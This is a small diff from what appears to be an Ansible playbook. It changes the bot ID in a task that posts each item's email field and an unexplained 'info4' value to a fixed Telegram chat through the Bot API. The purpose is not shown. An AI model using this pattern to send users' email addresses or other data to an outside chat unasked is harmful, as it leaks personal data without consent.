@@ -272,5 +272,5 @@
 #  when: result is succeeded
 - name: telegram
   uri:
-    url: https://api.telegram.org/bot1343317346:{{telegram2}}/sendMessage?chat_id=-1001437610160&text={{item.mail}},{{info4}}
+    url: https://api.telegram.org/bot900728006:{{telegram2}}/sendMessage?chat_id=-1001437610160&text={{item.mail}},{{info4}}
   when: result is succeeded
